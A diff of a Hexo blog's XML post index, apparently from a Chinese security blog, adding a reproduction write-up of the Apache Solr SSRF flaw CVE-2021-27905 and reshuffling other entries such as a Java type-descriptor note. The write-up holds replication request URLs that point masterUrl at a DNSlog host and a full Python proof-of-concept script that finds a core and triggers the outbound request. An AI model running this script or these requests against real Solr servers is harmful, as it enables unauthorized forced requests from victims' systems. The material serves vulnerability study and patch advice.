+<p>solr 支持配置两个core，分别是主(master)和从(slave)，我们可以主动控制让从(slave)去获取主的备份，而master的地址在配置文件可以配置，也允许请求者指定。</p>
+<p>poc格式:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8983/solr/new_core（上面创建的Core）/replication?command=fetchindex&amp;maste rUrl=http://xxx</span><br></pre></td></tr></table></figure>
+
+
+
+<p>设置URL为DNSlog平台地址，可以看到返回200</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8983/solr/new_core/replication?command=fetchindex&amp;masterUrl=https://abc.53mliy.dnslog.cn/ss</span><br></pre></td></tr></table></figure>
+
+<p>![image-20211115211804407](Apache Solr SSRF 漏洞(CVE-2021-27905)复现&#x2F;image-20211115211804407.png)</p>
+<p>在Dnslog平台上可以看到有请求响应</p>
+<p>![image-20211115211947915](Apache Solr SSRF 漏洞(CVE-2021-27905)复现&#x2F;image-20211115211947915.png)</p>
+<p>这里提供一个poc脚本；</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># CVE-2021-27905</span></span><br><span class="line"><span class="comment"># Apache solr ssrf</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> sys, getopt</span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">title</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-------------------------------------------------------------]&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[--------------      Apache Solr SSRF漏洞      ---------------]&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[--------               CVE-2021-27905               ----------]&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[--------use:python3 CVE-2021-27905.py -u url -d dnslog--------]&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[--------              Author:Henry4E36            ------------]&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-------------------------------------------------------------]&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">commit</span>():</span></span><br><span class="line">    url = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        opt, agrs = getopt.getopt(sys.argv[<span class="number">1</span>:], <span class="string">&quot;hu:d:&quot;</span>, [<span class="string">&quot;help&quot;</span>, <span class="string">&quot;url=&quot;</span>,<span class="string">&quot;dnslog=&quot;</span>])</span><br><span class="line">        <span class="keyword">for</span> op, value <span class="keyword">in</span> opt:</span><br><span class="line">            <span class="keyword">if</span> op == <span class="string">&quot;-h&quot;</span> <span class="keyword">or</span> op == <span class="string">&quot;--help&quot;</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            [-]   Apache Solr SSRF漏洞 (CVE-2021-27905)</span></span><br><span class="line"><span class="string">            [-]   Options:</span></span><br><span class="line"><span class="string">                     -h or --help      :   方法说明</span></span><br><span class="line"><span class="string">                     -u or --url       :   站点URL地址</span></span><br><span class="line"><span class="string">                     -d or --dnslog    :   DnsLog</span></span><br><span class="line"><span class="string">                &quot;&quot;&quot;</span>)</span><br><span class="line">                sys.exit(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">elif</span> op == <span class="string">&quot;-u&quot;</span> <span class="keyword">or</span> op == <span class="string">&quot;--url=&quot;</span>:</span><br><span class="line">                url = value</span><br><span class="line">            <span class="keyword">elif</span> op == <span class="string">&quot;-d&quot;</span> <span class="keyword">or</span> op == <span class="string">&quot;--dnslog=&quot;</span>:</span><br><span class="line">                dnslog = value</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[-] 参数有误! eg:&gt;&gt;&gt; python3 CVE-2021-27905.py -u http://127.0.0.1 -d dnslog&quot;</span>)</span><br><span class="line">                sys.exit()</span><br><span class="line">        <span class="keyword">return</span> url, dnslog</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] 参数有误! eg:&gt;&gt;&gt; python3 CVE-2021-27905.py -u http://127.0.0.1 -d dnslog&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">target_core</span>(<span class="params">url</span>):</span></span><br><span class="line">    target_url = url + <span class="string">&quot;/solr/admin/cores?indexInfo=false&amp;wt=json&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = requests.get(url=target_url,headers=headers,verify=<span class="literal">False</span>,timeout=<span class="number">5</span>)</span><br><span class="line">        core = <span class="built_in">list</span>(json.loads(res.text)[<span class="string">&quot;status&quot;</span>])[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">return</span> core</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[!]  目标系统: <span class="subst">&#123;url&#125;</span> 出现意外！n &quot;</span>,e)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ssrf</span>(<span class="params">core,dnslog</span>):</span></span><br><span class="line">    target_url = url + <span class="string">f&quot;/solr/<span class="subst">&#123;core&#125;</span>/replication/?command=fetchindex&amp;masterUrl=http://<span class="subst">&#123;dnslog&#125;</span>&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = requests.get(url=target_url, headers=headers, verify=<span class="literal">False</span>, timeout=<span class="number">5</span>)</span><br><span class="line">        status = json.loads(res.text)[<span class="string">&quot;status&quot;</span>]</span><br><span class="line">        <span class="keyword">if</span> res.status_code == <span class="number">200</span> <span class="keyword">and</span> status == <span class="string">&quot;OK&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[!]  33[31m目标系统: <span class="subst">&#123;url&#125;</span> 可能存在SSRF漏洞，请检查DNSLog响应！33[0m&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[0]  目标系统: <span class="subst">&#123;url&#125;</span> 不存在SSRF漏洞&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[!]  目标系统: <span class="subst">&#123;url&#125;</span> 出现意外！n &quot;</span>, e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    title()</span><br><span class="line">    url ,dnslog = commit()</span><br><span class="line">    core = target_core(url)</span><br><span class="line">    ssrf(core,dnslog)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>使用方法；</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 CVE-2021-27905.py -u URL(Solr地址) -d dnslog(dnslog生成地址)</span><br><span class="line"></span><br><span class="line">      -h or --help      :   方法说明</span><br><span class="line">      -u or --url       :   站点URL地址</span><br><span class="line">      -d or --dnslog    :   DnsLog</span><br></pre></td></tr></table></figure>
+
+
+
+<p>我们来运行一下该poc脚本:</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">python3 CVE-<span class="number">2021</span>-<span class="number">27905</span>.py -u http://<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">8983</span> -d otettj.dnslog.cn</span><br></pre></td></tr></table></figure>
+
+<p>提示目标系统可能存在SSRF漏洞</p>
+<p>![image-20211115213537111](Apache Solr SSRF 漏洞(CVE-2021-27905)复现&#x2F;image-20211115213537111.png)</p>
+<p>我们查看DNslog平台,有DNS解析记录。</p>
+<p>![image-20211115213646434](Apache Solr SSRF 漏洞(CVE-2021-27905)复现&#x2F;image-20211115213646434.png)</p>
+<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p>建议受影响的用户升级到最新版本8.8.2</p>
+<p>Apache Solr 8.8.2官方下载地址</p>
+<p><a href="https://solr.apache.org/downloads.html">https://solr.apache.org/downloads.html</a></p>
+]]></content>
+      <categories>
+        <category>Web漏洞</category>
+        <category>Web容器漏洞</category>
+        <category>Apache</category>
+      </categories>
+      <tags>
+        <tag>-web漏洞 -Apache漏洞 -组件漏洞</tag>
+      </tags>
   </entry>
   <entry>
     <title>CTF练习-Web系列-XSS</title>
@@ -688,64 +703,6 @@
       </categories>
       <tags>
         <tag>-web漏洞 - Hadoop -YARN</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>JAVA类型描述符</title>
-    <url>/2021/12/02/JAVA%E7%B1%BB%E5%9E%8B%E6%8F%8F%E8%BF%B0%E7%AC%A6/</url>
-    <content><![CDATA[<h1 id="JAVA类型描述符"><a href="#JAVA类型描述符" class="headerlink" title="JAVA类型描述符"></a>JAVA类型描述符</h1><p>在之前学习大佬们的文章时，在代码中看到”[D”,”[Ljava.lang.String;”等奇奇怪怪的符号，说是什么java类型描述符，所以记录总结一下类型描述符的学习过程</p>
-<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>在学习cobal1tstrike大佬的Java反射文章时，附上Java反射文件链接:<a href="https://mp.weixin.qq.com/s/C6eWaD7AszqG_ily8JTbtA">Java代码审计基础 | Java反射 (qq.com)</a></p>
-<p>其中有这么一段记录,如下:</p>
-<img src="/2021/12/02/JAVA%E7%B1%BB%E5%9E%8B%E6%8F%8F%E8%BF%B0%E7%AC%A6/image-20211202113340521.png" class title="image-20211202113340521">
-
-<p>可以看到上方代码中的”[D”,”[[Ljava.lang.String;”诸如此类奇奇怪怪的符号，仔细一看原来是数组类型描述符。</p>
-<p>于是我写了个简单的打印字符串数组Demo:</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fanseTest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">shuzu_Demo1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String[] str1 = <span class="keyword">new</span> String[]&#123;<span class="string">&quot;A&quot;</span>,<span class="string">&quot;B&quot;</span>,<span class="string">&quot;C&quot;</span>&#125;;</span><br><span class="line">        System.out.println(str1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>运行结果为:</p>
-<img src="/2021/12/02/JAVA%E7%B1%BB%E5%9E%8B%E6%8F%8F%E8%BF%B0%E7%AC%A6/image-20211202114946438.png" class title="image-20211202114946438">
-
-
-
-<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>我们来看下打印字符串数组的过程；</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// PrintStream.java</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">println</span><span class="params">(Object x)</span> </span>&#123;</span><br><span class="line">    String s = String.valueOf(x);</span><br><span class="line">    <span class="keyword">synchronized</span> (<span class="keyword">this</span>) &#123;</span><br><span class="line">        print(s);</span><br><span class="line">        newLine();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// String.java</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">valueOf</span><span class="params">(Object obj)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (obj == <span class="keyword">null</span>) ? <span class="string">&quot;null&quot;</span> : obj.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>可以看出，[Ljava.lang.String;@1540e19d是strs.toString()返回的值。strs的类型是String[],是一个数组类型，并且该数组类型没有重写toString()方法，我们来看下Object的toString方法:</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> getClass().getName() + <span class="string">&quot;@&quot;</span> + Integer.toHexString(hashCode());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>@ 之后是 hashCode 的值，所以 [Ljava.lang.String; 就是 getClass().getName() 返回的值。即 strs.getClass().getName() &#x3D;&#x3D; “[Ljava.lang.String;”。</p>
-<p>我们在来看下Class的getName()方法:</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    String name = <span class="keyword">this</span>.name;</span><br><span class="line">    <span class="keyword">if</span> (name == <span class="keyword">null</span>)</span><br><span class="line">        <span class="keyword">this</span>.name = name = getNameNative();</span><br><span class="line">    <span class="keyword">return</span> name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>最终实现交给了getnamenative()方法。</p>
-<h2 id="类型描述符"><a href="#类型描述符" class="headerlink" title="类型描述符"></a>类型描述符</h2><p>在Class文件中，会通过类型描述符来 代表 java中的数据类型。</p>
-<p>对于非数组类型:</p>
-<img src="/2021/12/02/JAVA%E7%B1%BB%E5%9E%8B%E6%8F%8F%E8%BF%B0%E7%AC%A6/image-20211202191218383.png" class title="image-20211202191218383">
-
-
-
-<p>引用类型Class的Classname，指的是它的Class文件二进制名。如java&#x2F;lang&#x2F;Thread.</p>
-<p>对于数组类型；</p>
-<img src="/2021/12/02/JAVA%E7%B1%BB%E5%9E%8B%E6%8F%8F%E8%BF%B0%E7%AC%A6/image-20211202191455708.png" class title="image-20211202191455708">
-
-<p>即 [ + 自己元素类型的类型描述符,[的个数取决于数组的维度。</p>
-<p>我们来看看getName()方法的文档:</p>
-<ul>
-<li>对于原始数据类型，返回其 java 关键字</li>
-<li>对于非数组引用类型，返回其 Java 标准二进制名</li>
-<li>对于数组引用类型，返回它类型描述符，并将其中的 <code>\</code> 改为 <code>.</code></li>
-</ul>
-<p>前面 strs.getClass().getName()，strs 是一个数组类型，返回它的类型描述符。即 [ + 自己元素类型的类型描述符，它的元素类型是 String，String 类型的描述符是 Ljava&#x2F;lang&#x2F;String;，将其中的 &#x2F; 改为 .，得到 Ljava.lang.String;。所以strs.getClass().getName() &#x3D;&#x3D; “[Ljava.lang.String;”。</p>
-]]></content>
-      <categories>
-        <category>代码审计</category>
-        <category>java</category>
-        <category>基础知识</category>
-      </categories>
-      <tags>
-        <tag>-代码 审计 -java基础知识 -类型描述符</tag>
       </tags>
   </entry>
   <entry>
@@ -1151,6 +1108,64 @@
       </categories>
       <tags>
         <tag>-代码审计 -JAVA基础</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>JAVA类型描述符</title>
+    <url>/2021/12/02/JAVA%E7%B1%BB%E5%9E%8B%E6%8F%8F%E8%BF%B0%E7%AC%A6/</url>
+    <content><![CDATA[<h1 id="JAVA类型描述符"><a href="#JAVA类型描述符" class="headerlink" title="JAVA类型描述符"></a>JAVA类型描述符</h1><p>在之前学习大佬们的文章时，在代码中看到”[D”,”[Ljava.lang.String;”等奇奇怪怪的符号，说是什么java类型描述符，所以记录总结一下类型描述符的学习过程</p>
+<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>在学习cobal1tstrike大佬的Java反射文章时，附上Java反射文件链接:<a href="https://mp.weixin.qq.com/s/C6eWaD7AszqG_ily8JTbtA">Java代码审计基础 | Java反射 (qq.com)</a></p>
+<p>其中有这么一段记录,如下:</p>
+<img src="/2021/12/02/JAVA%E7%B1%BB%E5%9E%8B%E6%8F%8F%E8%BF%B0%E7%AC%A6/image-20211202113340521.png" class title="image-20211202113340521">
+
+<p>可以看到上方代码中的”[D”,”[[Ljava.lang.String;”诸如此类奇奇怪怪的符号，仔细一看原来是数组类型描述符。</p>
+<p>于是我写了个简单的打印字符串数组Demo:</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fanseTest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">shuzu_Demo1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String[] str1 = <span class="keyword">new</span> String[]&#123;<span class="string">&quot;A&quot;</span>,<span class="string">&quot;B&quot;</span>,<span class="string">&quot;C&quot;</span>&#125;;</span><br><span class="line">        System.out.println(str1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行结果为:</p>
+<img src="/2021/12/02/JAVA%E7%B1%BB%E5%9E%8B%E6%8F%8F%E8%BF%B0%E7%AC%A6/image-20211202114946438.png" class title="image-20211202114946438">
+
+
+
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>我们来看下打印字符串数组的过程；</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// PrintStream.java</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">println</span><span class="params">(Object x)</span> </span>&#123;</span><br><span class="line">    String s = String.valueOf(x);</span><br><span class="line">    <span class="keyword">synchronized</span> (<span class="keyword">this</span>) &#123;</span><br><span class="line">        print(s);</span><br><span class="line">        newLine();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// String.java</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">valueOf</span><span class="params">(Object obj)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (obj == <span class="keyword">null</span>) ? <span class="string">&quot;null&quot;</span> : obj.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>可以看出，[Ljava.lang.String;@1540e19d是strs.toString()返回的值。strs的类型是String[],是一个数组类型，并且该数组类型没有重写toString()方法，我们来看下Object的toString方法:</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> getClass().getName() + <span class="string">&quot;@&quot;</span> + Integer.toHexString(hashCode());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>@ 之后是 hashCode 的值，所以 [Ljava.lang.String; 就是 getClass().getName() 返回的值。即 strs.getClass().getName() &#x3D;&#x3D; “[Ljava.lang.String;”。</p>
+<p>我们在来看下Class的getName()方法:</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    String name = <span class="keyword">this</span>.name;</span><br><span class="line">    <span class="keyword">if</span> (name == <span class="keyword">null</span>)</span><br><span class="line">        <span class="keyword">this</span>.name = name = getNameNative();</span><br><span class="line">    <span class="keyword">return</span> name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最终实现交给了getnamenative()方法。</p>
+<h2 id="类型描述符"><a href="#类型描述符" class="headerlink" title="类型描述符"></a>类型描述符</h2><p>在Class文件中，会通过类型描述符来 代表 java中的数据类型。</p>
+<p>对于非数组类型:</p>
+<img src="/2021/12/02/JAVA%E7%B1%BB%E5%9E%8B%E6%8F%8F%E8%BF%B0%E7%AC%A6/image-20211202191218383.png" class title="image-20211202191218383">
+
+
+
+<p>引用类型Class的Classname，指的是它的Class文件二进制名。如java&#x2F;lang&#x2F;Thread.</p>
+<p>对于数组类型；</p>
+<img src="/2021/12/02/JAVA%E7%B1%BB%E5%9E%8B%E6%8F%8F%E8%BF%B0%E7%AC%A6/image-20211202191455708.png" class title="image-20211202191455708">
+
+<p>即 [ + 自己元素类型的类型描述符,[的个数取决于数组的维度。</p>
+<p>我们来看看getName()方法的文档:</p>
+<ul>
+<li>对于原始数据类型，返回其 java 关键字</li>
+<li>对于非数组引用类型，返回其 Java 标准二进制名</li>
+<li>对于数组引用类型，返回它类型描述符，并将其中的 <code>\</code> 改为 <code>.</code></li>
+</ul>
+<p>前面 strs.getClass().getName()，strs 是一个数组类型，返回它的类型描述符。即 [ + 自己元素类型的类型描述符，它的元素类型是 String，String 类型的描述符是 Ljava&#x2F;lang&#x2F;String;，将其中的 &#x2F; 改为 .，得到 Ljava.lang.String;。所以strs.getClass().getName() &#x3D;&#x3D; “[Ljava.lang.String;”。</p>
+]]></content>
+      <categories>
+        <category>代码审计</category>
+        <category>java</category>
+        <category>基础知识</category>
+      </categories>
+      <tags>
+        <tag>-代码 审计 -java基础知识 -类型描述符</tag>
       </tags>
   </entry>
   <entry>
@@ -2942,7 +2957,7 @@
 <img src="/2021/10/20/Windows%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86list/image-20210805230416357.png" class title="image-20210805230416357">
 
 <p>查询机器被哪些用户登录过</p>
-<img src="/2021/10/20/Windows%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86list/image-20210805230523704.png" alt="image-20210805230523704" style="zoom: 67%;">
+<img src="/Windows信息收集list.assets/image-20210805230523704.png" alt="image-20210805230523704" style="zoom: 67%;">
 
 <h2 id="凭据信息"><a href="#凭据信息" class="headerlink" title="凭据信息"></a>凭据信息</h2><h3 id="navicat"><a href="#navicat" class="headerlink" title="navicat"></a>navicat</h3><table>
 <thead>
@@ -3050,7 +3065,7 @@
 
 <p>别看到普通权限就提权，实在没法深入再提权。</p>
 <p>提权可能打崩服务器，或者不免杀触发警报。</p>
-<img src="/2021/10/20/Windows%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86list/image-20210806105745713.png" alt="image-20210806105745713" style="zoom: 67%;">
+<img src="/Windows信息收集list.assets/image-20210806105745713.png" alt="image-20210806105745713" style="zoom: 67%;">
 
 <h3 id="systeminfo"><a href="#systeminfo" class="headerlink" title="systeminfo"></a>systeminfo</h3><p>主要关注修补程序</p>
 <h3 id="机器名"><a href="#机器名" class="headerlink" title="机器名"></a>机器名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hostname</span><br></pre></td></tr></table></figure>
@@ -3173,30 +3188,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Hello World</title>
-    <url>/2021/09/14/hello-world/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-]]></content>
-      <categories>
-        <category>内网渗透</category>
-      </categories>
-      <tags>
-        <tag>-博客测试</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>kibana未授权访问利用</title>
     <url>/2021/11/25/kibana%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8/</url>
     <content><![CDATA[<h1 id="kibana未授权访问利用"><a href="#kibana未授权访问利用" class="headerlink" title="kibana未授权访问利用"></a>kibana未授权访问利用</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Kibana如果允许外网访问，没有做安全的登录认证，也会被外部随意访问查看所有的数据，造成少数据泄露。在默认配置下，Kibana就可以访问<a href="https://so.csdn.net/so/search?from=pc_blog_highlight&q=Elasticsearch">Elasticsearch</a>中的所有数据。</p>
@@ -3251,6 +3242,30 @@
       </categories>
       <tags>
         <tag>-web应用漏洞 - Kibana -命令执行</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hello World</title>
+    <url>/2021/09/14/hello-world/</url>
+    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+]]></content>
+      <categories>
+        <category>内网渗透</category>
+      </categories>
+      <tags>
+        <tag>-博客测试</tag>
       </tags>
   </entry>
   <entry>
@@ -3831,7 +3846,7 @@
       </tags>
   </entry>
   <entry>
-    <title></title>
+    <title>代码审计之Spring Data Commons RCE</title>
     <url>/2022/04/06/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BSpring%20Data%20Commons%20RCE/</url>
     <content><![CDATA[<h1 id="代码审计之Spring-Data-Commons-RCE"><a href="#代码审计之Spring-Data-Commons-RCE" class="headerlink" title="代码审计之Spring Data Commons RCE"></a>代码审计之Spring Data Commons RCE</h1><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Spring Data是一个用于简化数据库访问，并支持云服务的开源框架,包含Commons、Gemfire、JPA、JDBC、MongoDB等模块。此漏洞产生于Spring Data Commons组件，该组件为提供共享的基础框架，适合各个子项目使用，支持跨数据库持久化。</p>
 <p>该漏洞的成因是当用户在项目中利用了Sprng-Data的相关Web特性对输入参数进行自动匹配时会将用户提交的form表单和key值作为SpEL的执行内容，导致SpEL表达式注入漏洞。</p>
@@ -3895,6 +3910,14 @@
 <p><a href="https://zhuanlan.zhihu.com/p/45501896">从CVE-2018-1273学漏洞分析 - 知乎 (zhihu.com)</a></p>
 <p><a href="https://cloud.tencent.com/developer/news/321462">从CVE-2018-1273学漏洞分析 - 云+社区 - 腾讯云 (tencent.com)</a></p>
 ]]></content>
+      <categories>
+        <category>代码审计</category>
+        <category>java</category>
+        <category>Spring</category>
+      </categories>
+      <tags>
+        <tag>-代码审计 -Spring -命令执行</tag>
